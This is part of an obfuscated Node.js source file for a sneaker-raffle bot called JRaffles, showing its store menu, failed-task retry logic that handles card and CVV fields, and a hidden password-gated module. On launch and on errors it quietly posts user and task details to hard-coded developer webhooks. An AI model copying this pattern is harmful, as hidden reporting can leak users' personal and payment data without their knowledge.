                                console['log'](_0x10a2e3['yellow'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x57cb60));
                            }
                        } catch (_0x2a21c9) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20' + _0x2a21c9)), _0x67ad40 = '' + _0x2a21c9;
                            var _0x2a1648 = await _0x14203e(kickz[_0x5e56f6], _0x161257, 'dev', !![], _0x67ad40);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x2a1648] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], EMBEDS['errorDEV']), await _0x1bfffd(_0x31e47f, EMBEDS['errorDEV']), _0x3e853c = 'yes';
                        } finally {
                            _0x43bd0d && _0x43bd0d['close']();
                            if (_0x3e853c == 'yes' && _0x585700 != 0x5 && _0x67ad40 != 'Size\x20Not\x20Found') {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x585700 + '\x20/\x205)')), _0x5e56f6 = _0x5e56f6 - 0x1, _0x585700 = _0x585700 + 0x1;
                                continue;
                            }
                            _0x3e853c == 'yes' && _0x585700 >= 0x5 && (_0x48f0c7(_0x46c478[_0x5e56f6], _0x161257), _0x3e853c = 'no', _0x585700 = 0x0), console['log']('Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x5c50bd) {
                    var _0xaecc6c = await _0x2f0fd(), _0x5e3f8d = _0xa4bb3a['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4deb7f = _0x5b1b10['parse'](_0x5e3f8d, { 'header': !![] })['data'];
                    for (var _0x3dfa7c = 0x0; _0x3dfa7c < _0x4deb7f['length']; _0x3dfa7c++) {
                        var _0x4ec330 = _0x4deb7f[_0x3dfa7c]['Store'], _0x9a63ea = _0x4deb7f[_0x3dfa7c]['Mode'];
                        for (var _0x283f7f of _0xae095a) {
                            const _0x12b61d = _0x283f7f['name']['includes'](_0x4ec330);
                            if (!_0x12b61d)
                                continue;
                            for (mode of _0x283f7f['modules']) {
                                if (mode['name'] == _0x9a63ea) {
                                    console['log']('Running\x20' + _0x10a2e3['cyan'](mode['name'])), await mode['function'](mode, [_0x4deb7f[_0x3dfa7c]], _0xaecc6c);
                                    var _0x227420 = _0x5e3f8d['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0xa4bb3a['writeFileSync']('../failed-tasks.csv', _0x227420);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x5ec219 = await _0x3432fc['get']('Answer');
                    if (_0x5ec219['Answer']['toLowerCase']() == 'y') {
                        _0xa4bb3a['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x2be9fc(0x3e8);
                        return;
                    }
                    if (_0x5ec219['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x2be9fc(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x2be9fc(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x3a76da(_0x5d2066) {
    var _0x17dc3c = await _0x2f0fd(), _0x182925 = _0xa4bb3a['readFileSync']('../failed-tasks.csv', 'utf-8'), _0xe8a76e = _0x5b1b10['parse'](_0x182925, { 'header': !![] })['data'];
    for (var _0x5d4d5d = 0x0; _0x5d4d5d < _0xe8a76e['length']; _0x5d4d5d++) {
        var _0x29d6d5 = _0xe8a76e[_0x5d4d5d]['Store'], _0x899bc4 = _0xe8a76e[_0x5d4d5d]['Mode'];
        for (var _0x3b3c9f of _0xae095a) {
            const _0x499b04 = _0x3b3c9f['name']['includes'](_0x29d6d5);
            if (_0x499b04)
                for (mode of _0xae095a[_0x3b3c9f]['modules']) {
                    const _0x51a790 = mode['name']['includes'](_0x899bc4);
                    _0x51a790 && (_0x5d2066 = mode['name'], await mode['function'](_0x5d2066, _0xe8a76e[_0x5d4d5d], _0x17dc3c));
                }
        }
    }
}
async function _0x102379() {
    await _0x5b8db3(), console['clear']();
    _0x30cea3['threads'] > 0x5 && (_0x30cea3['threads'] = 0x5);
    if (_0x1feaa0 != 'devkey') {
        let _0x3409b3 = await _0x159afb['autoUpdate']();
        if (_0x3409b3 === 'yes')
            return _0x38db06('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1f9581 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x2be9fc(0x2710);
        ;
    }
    await _0x290f40(_0x1f9581);
    if (_0x38d10e === ![])
        return console['log']('Closing\x20Browser'), await _0x2be9fc(0xbb8);
    else
        try {
            var _0x400f5a = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x3373db
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x1feaa0
                    }
                ]
            }];
            const _0x1a6025 = { 'embeds': _0x400f5a };
            var _0x332271 = await _0x14203e(null, null, 'open', ![]);
            const _0xfc7ec7 = { 'openDEVMSG': { 'embeds': [_0x332271] } };
            await _0x1bfffd(_0x152627, _0xfc7ec7['openDEVMSG']);
            async function _0x37ca30() {
                _0x1a7b1b('JRaffles\x20' + _0x1feaa0), console['clear'](), console['log']('Hello\x20' + _0x10a2e3['cyan']('' + _0x3373db) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x1feaa0), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x4cbfb5 = 0x0; _0x4cbfb5 < _0xae095a['length'] - 0x4; _0x4cbfb5++) {
                    if (_0x4cbfb5 >= 0xa) {
                        console['log']('\x20(' + _0x4cbfb5 + ')\x20[' + _0xae095a[_0x4cbfb5]['name'] + ']');
                        continue;
                    }
                    if (_0xae095a[_0x4cbfb5]['name'] === 'Reload\x20Settings' || _0xae095a[_0x4cbfb5]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x4cbfb5 + ')\x20\x20[' + _0xae095a[_0x4cbfb5]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0xae095a['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0xae095a['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0xae095a['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0xae095a['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x18aecd();
                if (taskModule > _0xae095a['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x2be9fc(0x3e8), _0x37ca30();
                if (_0xae095a[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                    var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x403fe3 = await _0x2f0fd();
                            await _0x25662d['function'](_0x25662d, _0x403fe3);
                        }
                        if (taskFunction == 0x2) {
                            var _0x403fe3 = await _0x2f0fd(), _0x17390c = await _0x265bfe(_0x25662d);
                            _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x17390c), await _0x25662d['function'](_0x25662d, _0x17390c, _0x403fe3);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x403fe3 = await _0x2f0fd(), _0x17390c = await _0x265bfe(_0x25662d);
                                _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x17390c), await _0x25662d['function'](_0x25662d, _0x17390c, _0x403fe3);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x403fe3 = await _0x2f0fd();
                                    await _0x25662d['function'](_0x25662d, _0x403fe3);
                                }
                            }
                        }
                    } catch (_0x39e11e) {
                        console['log'](_0x39e11e), await _0x2be9fc(0x7d0);
                    }
                    return _0x37ca30();
                }
                if (_0xae095a[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                        var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x403fe3 = await _0x2f0fd(), _0x203b9e = await _0x265bfe(_0x25662d);
                            _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x203b9e), await _0x25662d['function'](_0x25662d, _0x203b9e, _0x403fe3);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x403fe3 = await _0x2f0fd(), _0x203b9e = await _0x265bfe(_0x25662d);
                                _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x203b9e), await _0x25662d['function'](_0x25662d, _0x203b9e, _0x403fe3);
                            }
                        }
                    } catch (_0x4d01f8) {
                        console['log'](_0x4d01f8), await _0x2be9fc(0xfa0);
                    }
                    return _0x37ca30();
                }
                if (_0xae095a[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                        var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x403fe3 = await _0x2f0fd(), _0x203b9e = await _0x265bfe(_0x25662d);
                            _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x203b9e), await _0x25662d['function'](_0x25662d, _0x203b9e, _0x403fe3);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x403fe3 = await _0x2f0fd(), _0x203b9e = await _0x265bfe(_0x25662d);
                                _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x203b9e), await _0x25662d['function'](_0x25662d, _0x203b9e, _0x403fe3);
                            }
                        }
                    } catch (_0x339109) {
                        console['log'](_0x339109), await _0x2be9fc(0xfa0);
                    }
                    return _0x37ca30();
                }
                if (_0xae095a[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                    var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x403fe3 = await _0x2f0fd();
                        return await _0x25662d['function'](_0x25662d, _0x403fe3), _0x37ca30();
                    }
                    var _0x403fe3 = await _0x2f0fd(), _0x106e92 = await _0x265bfe(_0x25662d);
                    return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x106e92), await _0x25662d['function'](_0x25662d, _0x106e92, _0x403fe3), _0x37ca30();
                }
                if (_0xae095a[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                    var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x403fe3 = await _0x2f0fd(), _0x106e92 = await _0x265bfe(_0x25662d);
                    return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x106e92), await _0x25662d['function'](_0x25662d, _0x106e92, _0x403fe3), _0x37ca30();
                }
                if (_0xae095a[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                    var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x403fe3 = await _0x2f0fd(), _0x106e92 = await _0x265bfe(_0x25662d);
                    return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x106e92), await _0x25662d['function'](_0x25662d, _0x106e92, _0x403fe3), _0x37ca30();
                }
                if (_0xae095a[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                    var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x403fe3 = await _0x2f0fd(), _0x106e92 = await _0x265bfe(_0x25662d);
                    return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x106e92), await _0x25662d['function'](_0x25662d, _0x106e92, _0x403fe3), _0x37ca30();
                } else {
                    if (_0xae095a[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                        var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x403fe3 = await _0x2f0fd(), _0x4e57d2 = await _0x265bfe(_0x25662d);
                            return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x4e57d2), await _0x25662d['function'](_0x25662d, _0x4e57d2, _0x403fe3), _0x37ca30();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x403fe3 = await _0x2f0fd();
                                return await _0x25662d['function'](_0x25662d, null, _0x403fe3), _0x37ca30();
                            }
                        }
                        ;
                    } else {
                        if (_0xae095a[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                            var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction], _0x403fe3 = await _0x2f0fd(), _0x2e5222 = await _0x265bfe(_0x25662d);
                            return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x2e5222), await _0x25662d['function'](_0x25662d, _0x2e5222, _0x403fe3), await _0x2be9fc(0x1388), _0x37ca30();
                        } else {
                            if (_0xae095a[taskModule]['name'] == 'Google\x20Forms') {
                                taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                                var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction], _0x403fe3 = await _0x2f0fd(), _0x2e5222 = await _0x265bfe(_0x25662d);
                                return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x2e5222), await _0x25662d['function'](_0x25662d, _0x2e5222, _0x403fe3), await _0x2be9fc(0x1388), _0x37ca30();
                            } else {
                                if (_0xae095a[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                                    var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x403fe3 = await _0x2f0fd(), _0x4e57d2 = await _0x265bfe(_0x25662d);
                                        return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x4e57d2), await _0x25662d['function'](_0x25662d, _0x4e57d2, _0x403fe3), _0x37ca30();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x403fe3 = await _0x2f0fd();
                                            return await _0x25662d['function'](_0x25662d, null, _0x403fe3), _0x37ca30();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0xae095a[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                                        var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x25662d);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0xae095a[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                                            var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x403fe3 = await _0x2f0fd(), _0x41a172 = await _0x265bfe(_0x25662d);
                                                return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x41a172), await _0x25662d['function'](_0x25662d, _0x41a172, _0x403fe3), _0x37ca30();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x403fe3 = await _0x2f0fd(), _0x41a172 = await _0x265bfe(_0x25662d);
                                                    return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x41a172), await _0x25662d['function'](_0x25662d, _0x41a172, _0x403fe3), _0x37ca30();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0xae095a[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                                                var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x403fe3 = await _0x2f0fd(), _0x359998 = await _0x265bfe(_0x25662d);
                                                    return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x359998), await _0x25662d['function'](_0x25662d, _0x359998, _0x403fe3), _0x37ca30();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x403fe3 = await _0x2f0fd(), _0x359998 = await _0x265bfe(_0x25662d);
                                                        return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x359998), await _0x25662d['function'](_0x25662d, _0x359998, _0x403fe3), _0x37ca30();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0xae095a[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                                                    var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x403fe3 = await _0x2f0fd(), _0x234f07 = await _0x265bfe(_0x25662d);
                                                        return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x234f07), await _0x25662d['function'](_0x25662d, _0x234f07, _0x403fe3), _0x37ca30();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x403fe3 = await _0x2f0fd(), _0x234f07 = await _0x265bfe(_0x25662d);
                                                            return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x234f07), await _0x25662d['function'](_0x25662d, _0x234f07, _0x403fe3), _0x37ca30();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0xae095a[taskModule]['name'] == 'JD') {
                                                        taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                                                        var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x403fe3 = await _0x2f0fd(), _0x34d28e = await _0x265bfe(_0x25662d);
                                                            return _0x30cea3['shuffleTasks'] && await _0x38dbd9(_0x34d28e), await _0x25662d['function'](_0x25662d, _0x34d28e, _0x403fe3), _0x37ca30();
                                                        }
                                                    } else {
                                                        if (_0xae095a[taskModule]['name'] == 'Seven\x20Store')
                                                            return console['log']('returning\x20to\x20menu'), await _0x2be9fc(0x3e8), _0x37ca30();
                                                        else {
                                                            if (_0xae095a[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                var _0x2f2df5 = _0xae095a[taskModule]['name'], _0x403fe3 = await _0x2f0fd();
                                                                return await _0x3ce909(_0x2f2df5, _0x403fe3), _0x37ca30();
                                                            } else {
                                                                if (_0xae095a[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                    taskFunction = await _0x23c8d4(_0xae095a[taskModule]['modules']);
                                                                    var _0x25662d = _0xae095a[taskModule]['modules'][taskFunction];
                                                                    return await _0x25662d['function'](_0x25662d), _0x37ca30();
                                                                } else {
                                                                    if (_0xae095a[taskModule]['name'] == 'Change\x20Settings') {
                                                                        console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                        var _0x23a3ae = 0x0;
                                                                        for (const _0x4d1ed1 in _0x30cea3) {
                                                                            console['log']('(' + _0x23a3ae + ')\x20' + _0x4d1ed1 + '\x20:\x20' + _0x30cea3[_0x4d1ed1]), _0x23a3ae++;
                                                                        }
                                                                        console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x23a3ae + ')\x20Return\x20to\x20Main\x20Menu');
                                                                        var _0x41e50b = await _0x2654ae();
                                                                        if (_0x41e50b == _0x23a3ae)
                                                                            return _0x37ca30();
                                                                        console['clear'];
                                                                        var _0x3ab84b = 0x0;
                                                                        for (var _0x212641 in _0x30cea3) {
                                                                            if (_0x41e50b == _0x3ab84b) {
                                                                                console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x212641 + '\x20:'), _0x30cea3[_0x212641] = await _0x2fe4f7(), _0xa4bb3a['writeFileSync']('../settings.json', JSON['stringify'](_0x30cea3));
                                                                                break;
                                                                            } else
                                                                                _0x3ab84b++;
                                                                        }
                                                                        return console['log']('Settings\x20Saved!'), await _0x2be9fc(0xbb8), _0x37ca30();
                                                                    } else {
                                                                        if (_0xae095a[taskModule]['name'] == 'Reload\x20Settings')
                                                                            return console['log']('Reloading\x20settings'), await _0x5b8db3(), _0x37ca30();
                                                                        else {
                                                                            if (taskModule == 0x45) {
                                                                                _0xae095a[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                var _0x29bdcd = await _0x1119b3();
                                                                                _0x29bdcd == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x53290c(), await afewFunction(_0x2c6858[_0x422ee7], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x2be9fc(0xbb8));
                                                                            } else {
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x37ca30();
            } catch (_0x21330f) {
                return console['log'](_0x21330f), await _0x2be9fc(0x2710), _0x37ca30();
            }
        } catch (_0x4af0a9) {
            return console['log'](_0x4af0a9), await _0x2be9fc(0x3a98);
        }
}
;
_0x1a7b1b('JRaffles\x20' + _0x1feaa0);
try {
    _0x5b8db3(), _0x102379();
} catch (_0x3682d2) {
    var _0x502dad = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x3373db
            },
            {
                'name': 'Version',
                'value': '' + _0x1feaa0
            },
            {
                'name': 'Error',
                'value': '' + _0x3682d2
            }
        ]
    }];
    const _0x579f1a = { 'embeds': _0x502dad };
    _0x1bfffd(_0x31e47f, _0x579f1a);
}